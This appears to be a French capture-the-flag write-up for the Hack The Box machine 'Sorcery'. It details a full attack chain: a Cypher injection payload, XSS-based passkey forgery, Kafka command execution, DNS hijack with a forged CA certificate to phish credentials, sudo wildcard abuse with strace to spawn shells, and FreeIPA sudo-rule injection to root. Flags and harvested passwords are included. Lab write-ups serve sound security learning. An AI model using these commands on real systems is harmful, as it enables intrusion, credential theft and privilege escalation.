# Sorcery - HTB Insane (Linux) - WriteUp (en cours)

## Résumé
Machine Insane avec une architecture Docker complexe (9 containers) + FreeIPA domain. Chaîne d'attaque: Cypher Injection → XSS/WebAuthn Forgery → Kafka RCE → DNS Hijack + CA key → Phishing → SSH → FreeIPA privesc (IPA group roles → sudo rule injection).

**User flag:** `15ea22ee4d2cbcc5f4b9b5632db6ee91`
**Root flag:** `b1e15dd687f19c6dbed6f0ed92c79147`

## Reconnaissance

### Nmap
```
22/tcp  open  ssh      OpenSSH 9.6p1
443/tcp open  ssl/http nginx 1.27.1
```

### Hostnames
- `sorcery.htb` → Next.js app
- `git.sorcery.htb` → Gitea 1.22.1

### Source code
Repo public sur Gitea: `nicole_sullivan/infrastructure`
```bash
GIT_SSL_NO_VERIFY=true git clone https://git.sorcery.htb/nicole_sullivan/infrastructure.git
```

## Étape 1: Register + Passkey Enrollment

L'app utilise WebAuthn/FIDO2 pour l'authentification par passkey. Certaines fonctionnalités (blog, store) nécessitent `withPasskey: true`.

**Automatisation complète** via les Next.js Server Actions:
1. Register `hacker1` via action ID `cc5a75671722b7fa3634cb7cc01d2022f9d19e5b`
2. Login → JWT (withPasskey=false)
3. Enroll passkey via profile actions (startRegistration/finishRegistration)
4. Login via passkey → JWT (withPasskey=true)

Pas besoin de Chrome ni de virtual authenticator - tout se fait via API avec une clé EC P-256 générée localement.

## Étape 2: Cypher Injection → Registration Key

Le backend Rust utilise une macro qui construit les requêtes Cypher avec `format!()` sans sanitisation:
```
GET /dashboard/store/{INJECTION}
```

Payload UNION ALL pour extraire le `registration_key` du nœud Config:
```
x"}) RETURN result UNION ALL MATCH (c:Config) RETURN {id: c.registration_key, ...} as result UNION ALL MATCH (result:ZZZZZ {a: "
```

→ `registration_key: dd05d743-b560-45dc-9a09-43ab18c7a513`

## Étape 3: Seller Registration + XSS

Avec la registration key, on s'inscrit comme Seller et on insère un produit avec XSS dans la description (`dangerouslySetInnerHTML`).

## Étape 4: XSS → Admin Passkey (technique clé)

Le backend spawne un headless Chrome qui visite chaque nouveau produit avec un JWT admin (httpOnly, limité aux paths product + webauthn register).

**Problème:** Le Chrome est dans un container Docker et ne peut pas joindre notre IP VPN.

**Solution: Attestation inline pré-calculée.** L'attestation WebAuthn "none" ne contient pas de signature crypto sur le challenge. Le `attestationObject` est fixe et pré-calculable. Seul le `clientDataJSON` change (juste du base64url d'un JSON avec le challenge).

Tout le payload tient dans un `<img onerror="eval(atob('...'))">` (~1650 chars).

→ Passkey enregistrée pour admin, authentification avec JWT full admin.

## Étape 5: Debug SSRF → Kafka RCE

Le debug endpoint est un proxy TCP brut vers tout le réseau Docker. On forge un Kafka ProduceRequest binaire pour envoyer une commande au consumer DNS qui fait `bash -c <message>`.

**⚠️ Le consumer est single-threaded.** Un reverse shell en foreground bloque le consumer indéfiniment. Toujours utiliser `&` dans un sous-shell.

→ Shell sur le container DNS (user non-root).

## Étape 6: Chisel Tunnel

Transfert de chisel via `/dev/tcp` (pas de curl/wget dans le container), puis reverse tunnels vers tous les services internes.

## Étape 7: Phishing tom_summers

### Concept
Le `mail_bot` simule un employé (tom_summers) qui reçoit des emails. Si le lien est sur `*.sorcery.htb` en HTTPS avec un cert signé par le Root CA de l'entreprise, il visite et soumet ses credentials (`PHISHING_USERNAME`/`PHISHING_PASSWORD`).

On a: un shell dans le container DNS (contrôle DNS + accès FTP interne) + la clé privée du Root CA.

### Récupération du vrai CA depuis le FTP (bash pur)
Le container DNS n'a ni curl ni wget. FTP en bash avec EPSV:
```bash
exec 3<>/dev/tcp/ftp/21; read -r b <&3
echo -e "USER anonymous\r" >&3; read -r r <&3
echo -e "PASS x\r" >&3; read -r r <&3
echo -e "EPSV\r" >&3; read -r r <&3; echo "$r"
# → 229 Entering Extended Passive Mode (|||21101|)
exec 4<>/dev/tcp/ftp/21101
echo -e "RETR pub/RootCA.crt\r" >&3
cat <&4 > /tmp/RootCA.crt; exec 4>&-
echo -e "QUIT\r" >&3; exec 3>&-
# Pareil pour RootCA.key
```

### Génération du certificat
```bash
openssl rsa -in /tmp/RootCA.key -out /tmp/RootCA_dec.key -passin pass:password
openssl req -newkey rsa:2048 -nodes -keyout /tmp/git.key -out /tmp/git.csr \
  -subj "/CN=git.sorcery.htb" -addext "subjectAltName=DNS:git.sorcery.htb"
openssl x509 -req -in /tmp/git.csr -CA /tmp/RootCA.crt -CAkey /tmp/RootCA_dec.key \
  -CAcreateserial -out /tmp/git.crt -days 365 -copy_extensions copyall
cat /tmp/git.crt /tmp/RootCA.crt > /tmp/git-chain.crt
openssl verify -CAfile /tmp/RootCA.crt /tmp/git.crt  # → OK
```

### DNS hijack + serveur phishing
```bash
echo "$(hostname -i) git.sorcery.htb" > /dns/hosts-user
kill -HUP $(pidof dnsmasq)
```

Le serveur Python doit être transféré via **base64** car l'indentation Python se casse dans un reverse shell:
```bash
# Sur Parrot: encoder le script
python3 -c "import base64; code=b'''import ssl,http.server\nclass H(http.server.BaseHTTPRequestHandler):\n def log(self):\n  ...\n do_GET=do_POST=do_PUT=log\n...\n'''; print(base64.b64encode(code).decode())"

# Dans le container
echo "<BASE64>" | base64 -d > /tmp/s.py
python3 /tmp/s.py > /tmp/server.log 2>&1 &
```

Le serveur log tout (GET, POST, body) dans `/tmp/all.log`.

### Envoi du mail + résultat
```bash
{
echo -e "EHLO sorcery.htb\r"; sleep 0.3
echo -e "MAIL FROM:<gitea@sorcery.htb>\r"; sleep 0.3
echo -e "RCPT TO:<tom_summers@sorcery.htb>\r"; sleep 0.3
echo -e "DATA\r"; sleep 0.3
echo -e "Subject: Security Alert\r\n\r"
echo -e "https://git.sorcery.htb/user/login\r\n.\r"; sleep 0.3
echo -e "QUIT\r"
} > /dev/tcp/mail/1025
```

Après ~60s:
```
GET /user/login
GET /favicon.ico
POST /user/login user_name=tom_summers&password=jNsMKQ6k2.XDMPu.
```

→ **Credentials: `tom_summers` / `jNsMKQ6k2.XDMPu.`**

### Erreurs courantes
- **"not signed by our CA"**: Le cert a été signé par un CA régénéré (même clé, cert différent). Utiliser le **vrai** RootCA.crt du FTP.
- **Bot visite mais ne soumet pas**: Le serveur a crashé entre la visite et le POST, ou `openssl s_server` utilisé au lieu de Python (gère mal HTTP).
- **Script Python ne démarre pas**: Indentation cassée par le reverse shell → toujours transférer via base64.
- **Kafka consumer bloqué**: Les commandes de diagnostic complexes bloquent le consumer. Garder les commandes Kafka minimales.

## Étape 8: SSH → User Flag

```bash
ssh tom_summers@sorcery.htb
# Password: jNsMKQ6k2.XDMPu.

cat ~/user.txt
# 15ea22ee4d2cbcc5f4b9b5632db6ee91
```

## Étape 9: Énumération post-exploitation

### Utilisateurs
- `tom_summers` (2001, local) - pas de sudo
- `tom_summers_admin` (2002, local) - password inconnu, password reuse échoue
- `rebecca_smith` (2003, local) - password inconnu
- `admin` (1638400000, IPA) - owner de `/opt/scripts/` (mode 0700)
- `donna_adams` (1638400003, IPA)
- `ash_winter` (1638400004, IPA)

### FreeIPA (SORCERY.HTB)
L'hôte est client d'un domaine FreeIPA:
- **DC:** `dc01.sorcery.htb` (172.23.0.2, réseau Docker 172.23.0.0/16)
- **SSSD** configuré, SSH avec GSSAPIAuthentication + AuthorizedKeysCommand via sss
- **krb5.conf:** realm SORCERY.HTB, KDC à dc01.sorcery.htb:88
- `/etc/krb5.keytab` existe mais lisible par root uniquement

LDAP anonyme disponible:
```bash
ldapsearch -x -H ldap://172.23.0.2 -b "cn=users,cn=accounts,dc=sorcery,dc=htb" uid
# admin, donna_adams, ash_winter
ldapsearch -x -H ldap://172.23.0.2 -b "cn=groups,cn=accounts,dc=sorcery,dc=htb" cn
# admins, sysadmins (vide), ipausers, editors, trust admins
```

`tom_summers` n'est PAS un principal Kerberos (kinit: not found in Kerberos database).

### SUID: ksu.mit
```
-rwsr-xr-x 1 root root 47416 /usr/bin/ksu.mit
Usage: ksu.mit [target user] [-n principal] [-c source cachename] [-k] ...
```
Kerberos su — permet de devenir un autre user si on possède un TGT Kerberos valide.

### Docker
- userns-remap (offset 165536) → les process containers tournent avec des UIDs élevés
- Docker socket est `root:docker`, tom_summers pas dans le groupe
- `/proc/*/environ` des containers pas lisible (UIDs remappés)

### Réseaux
| Bridge | Subnet | Usage |
|--------|--------|-------|
| br-9ea714ea7b8c | 172.19.0.0/16 | Containers applicatifs |
| br-3ff4274bb73e | 172.23.0.0/16 | FreeIPA DC |
| br-24ea6f65bc59 | 172.21.0.0/16 | Inconnu (172.21.0.2 up) |

## Étape 10: tom_summers → tom_summers_admin (Xvfb Framebuffer)

Le process Xvfb tourne avec `-fbdir /xorg/xvfb/` et crée le fichier `/xorg/xvfb/Xvfb_screen0` (raw framebuffer, 512x256x24 bits). Ce fichier est **lisible par tom_summers**.

L'application Mousepad est ouverte dans ce framebuffer virtuel avec le fichier `/provision/cron/tom_summers_admin/passwords.txt`.

**Extraction du framebuffer → PNG:**
```bash
# Sur la machine cible
cat /xorg/xvfb/Xvfb_screen0 > /tmp/fb.raw

# Sur Parrot (après scp)
python3 -c "
from PIL import Image
import struct
data = open('fb.raw','rb').read()
img = Image.frombytes('RGB', (512, 256), data, 'raw', 'BGRX')
img.save('fb.png')
"
```

Le PNG révèle: `tom_summers_admin / dWpuk7cesBjT-`

```bash
su - tom_summers_admin  # password: dWpuk7cesBjT-
```

## Étape 11: tom_summers_admin → rebecca_smith (Sudoers Wildcard + Strace)

### Sudo rules
```
tom_summers_admin sorcery = (rebecca_smith) NOPASSWD: /usr/bin/docker login
tom_summers_admin sorcery = (rebecca_smith) NOPASSWD: /usr/bin/strace -s 128 -p [0-9]*
```

### Exploitation du wildcard `[0-9]*`
Le pattern sudoers `[0-9]*` signifie: un chiffre suivi de **n'importe quoi** (incluant les espaces). Cela permet d'injecter des arguments supplémentaires après un PID valide.

La fonctionnalité `strace -o '|command'` exécute une commande et y redirige la sortie de strace. Combiné avec le wildcard, on peut exécuter des commandes arbitraires en tant que rebecca_smith.

### Extraction des docker credentials
```bash
# Terminal 1: lancer docker login en background
sudo -u rebecca_smith /usr/bin/docker login &
DOCKER_PID=$!

# Terminal 2: strace avec argument injection
sudo -u rebecca_smith /usr/bin/strace -s 128 -p $DOCKER_PID -o '|/bin/bash -c "echo https://index.docker.io/v1/ | docker-credential-docker-auth get > /tmp/rc4 && chmod 644 /tmp/rc4"'
```

Alternative directe pour obtenir un shell:
```bash
sudo -u rebecca_smith /usr/bin/strace -s 128 -p 1 -o '|/bin/bash'
```

→ **Credentials: `rebecca_smith` / `-7eAZDp9-f9mg`** (SSH fonctionne)

## Étape 12: rebecca_smith → ash_winter (IPA /proc Monitoring)

Le service `cleanup.service` s'exécute toutes les 10 minutes en tant que l'utilisateur `admin` (IPA). Il exécute `/opt/scripts/cleanup.sh`.

### Monitoring /proc pour capturer les commandes éphémères
```bash
# Boucle de monitoring des process de admin (UID 1638400000)
while true; do
  for d in /proc/[0-9]*/; do
    if [ -r "$d/cmdline" ] 2>/dev/null; then
      uid=$(awk '/^Uid:/{print $2}' "$d/status" 2>/dev/null)
      if [ "$uid" = "1638400000" ]; then
        cmd=$(tr '\0' ' ' < "$d/cmdline" 2>/dev/null)
        [ -n "$cmd" ] && echo "$cmd"
      fi
    fi
  done
done 2>/dev/null | sort -u
```

Le script cleanup.sh exécute entre autres:
```
ipa user-mod ash_winter --setattr userPassword=w@LoiU8Crmdep
```

→ **Credentials: `ash_winter` / `w@LoiU8Crmdep`** (Kerberos password)

## Étape 13: ash_winter → root (FreeIPA Role Abuse → Sudo Rule Injection)

ash_winter est "Indirect Member of role: add_sysadmin" dans FreeIPA, ce qui permet de s'ajouter au groupe sysadmins. Le groupe sysadmins est "Indirect Member of role: manage_sudorules_ldap", ce qui permet de créer des sudo rules arbitraires via IPA.

### Prérequis: fixer le HOME directory
Le home de ash_winter n'existe pas sur l'hôte, les commandes `ipa` échouent sans HOME valide:
```bash
kinit ash_winter  # password: w@LoiU8Crmdep
export HOME=/tmp
mkdir -p /tmp/.ipa/log
```

### Étape 1: S'ajouter au groupe sysadmins
```bash
ipa group-add-member sysadmins --users=ash_winter
```

### Étape 2: Appliquer le changement de groupe
ash_winter peut exécuter `sudo /usr/bin/systemctl restart sssd` en NOPASSWD:
```bash
sudo /usr/bin/systemctl restart sssd
```

### Étape 3: Créer une sudo rule IPA donnant tous les droits root
```bash
ipa sudorule-add ash_root --cmdcat=all --hostcat=all
ipa sudorule-add-user ash_root --users=ash_winter
ipa sudorule-add-runasuser ash_root --users=root
ipa sudorule-add-runasgroup ash_root --groups=root
```

### Étape 4: Appliquer la nouvelle sudo rule
```bash
sudo /usr/bin/systemctl restart sssd
```

### Étape 5: Root
```bash
sudo -u root /bin/bash
cat /root/root.txt
# b1e15dd687f19c6dbed6f0ed92c79147
```

### Résumé de la chaîne FreeIPA
```
ash_winter (Indirect Member of role: add_sysadmin)
  → ipa group-add-member sysadmins --users=ash_winter
  → sudo systemctl restart sssd (NOPASSWD)
  → sysadmins (Indirect Member of role: manage_sudorules_ldap)
  → ipa sudorule-add → full sudo as root
  → sudo systemctl restart sssd
  → sudo -u root /bin/bash → ROOT
```
